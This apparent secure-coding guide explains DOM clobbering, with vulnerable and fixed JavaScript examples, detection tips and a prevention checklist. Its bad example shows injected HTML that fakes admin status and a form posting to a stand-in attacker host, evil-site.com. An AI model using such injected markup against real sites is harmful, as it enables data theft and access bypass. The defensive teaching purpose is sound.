---
name: "dom-clobbering-anti-pattern"
description: "Security anti-pattern for DOM Clobbering vulnerabilities (CWE-79 variant). Use when generating or reviewing code that accesses DOM elements by ID, uses global variables, or relies on document properties. Detects HTML injection that overwrites JavaScript globals."
---

# DOM Clobbering Anti-Pattern

**Severity:** Medium

## Summary

DOM Clobbering is a subtle but dangerous vulnerability where attacker-controlled HTML can overwrite global JavaScript variables or DOM properties. When an HTML element is created with an `id` or `name` attribute, some browsers automatically create a global variable with that name, pointing to the element. This can "clobber" (overwrite) legitimate variables or objects in the application, leading to client-side logic bypasses, XSS, and other attacks. This is especially risky even when using HTML sanitizers, as `id` and `name` are often allowed.

## The Anti-Pattern

The anti-pattern occurs when an application's JavaScript code relies on global variables that can be overwritten by HTML elements injected by an attacker. The code expects to access a legitimate object or value but instead gets a reference to a DOM element.

### BAD Code Example

```javascript
// VULNERABLE: Using a global variable that can be clobbered.

// Imagine this HTML is injected into the page by an attacker:
// <div id="appConfig"></div>

// The application code expects `appConfig` to be a configuration object.
// However, `window.appConfig` now points to the <div> element above.
if (window.appConfig.isAdmin) {
    // A DOM element is "truthy", so this check passes.
    // The attacker gains access to the admin panel without being an admin.
    showAdminPanel();
}

// Another example:
// Injected HTML: <form id="someForm" action="https://evil-site.com">
// Legitimate button: <button onclick="submitForm()">Submit</button>

function submitForm() {
    // The code intends to get a legitimate form, but gets the injected one.
    var form = document.getElementById('someForm');
    form.submit(); // Submits data to the attacker's site.
}
```

### GOOD Code Example

```javascript
// SECURE: Avoid global variables and validate DOM elements.

// 1. Use a namespace for your application's objects.
const myApp = {};
myApp.config = {
    isAdmin: false
    // ... other config
};

// Access the configuration through the namespace.
if (myApp.config.isAdmin) {
    showAdminPanel();
}

// 2. Validate the type of element retrieved from the DOM.
function submitForm() {
    var form = document.getElementById('someForm');
    // Check that the element is actually a form before using it.
    if (form instanceof HTMLFormElement) {
        form.submit();
    } else {
        console.error("Error: 'someForm' is not a valid form element.");
    }
}

// 3. Freeze critical objects to prevent modification.
Object.freeze(myApp.config);
```

## Detection

- **Review JavaScript Code:** Look for direct access to global variables (e.g., `window.someConfig`, or just `someConfig`) where the variable is expected to be an object or hold a security-critical value.
- **Analyze HTML Sanitizer Configuration:** Check if your HTML sanitizer allows `id` and `name` attributes. While often necessary for functionality, it's the root cause of DOM Clobbering.
- **Test for Clobbering:** Try to inject HTML elements with `id` attributes that match the names of global variables used in your application's code. For example, if your code uses a `config` object, inject `<div id="config">`.

## Prevention

- [ ] **Avoid using global variables** for security-critical operations or configurations. Instead, use a private namespace (e.g., `const myApp = { config: { ... } };`).
- [ ] **Freeze critical objects** using `Object.freeze()` to make them read-only, preventing them from being overwritten.
- [ ] **Validate the type** of any object retrieved from the DOM before using it (e.g., `if (elem instanceof HTMLFormElement)`).
- [ ] **Use a robust HTML sanitizer**, but be aware that allowing `id` and `name` attributes still leaves you vulnerable. DOM Clobbering protection must be implemented in your JavaScript code.
- [ ] **Use prefixes for element IDs** that are unlikely to collide with global variables (e.g., `id="myapp-user-form"`).

## Related Security Patterns & Anti-Patterns

- [Cross-Site Scripting (XSS) Anti-Pattern](../xss/): DOM Clobbering can be a vector to enable XSS.
- [Mutation XSS Anti-Pattern](../mutation-xss/): Another sanitizer-bypass technique that abuses the way browsers parse HTML.
- [Missing Input Validation Anti-Pattern](../missing-input-validation/): Failing to validate the type of a DOM element is a form of missing input validation.

## References

- [OWASP Top 10 A05:2025 - Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [OWASP GenAI LLM05:2025 - Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CAPEC-588: DOM-Based XSS](https://capec.mitre.org/data/definitions/588.html)
- [PortSwigger DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering Research](https://research.securitum.com/xss-in-chrome-extensions-with-dom-clobbering/)
- Source: [sec-context](https://github.com/Arcanum-Sec/sec-context)
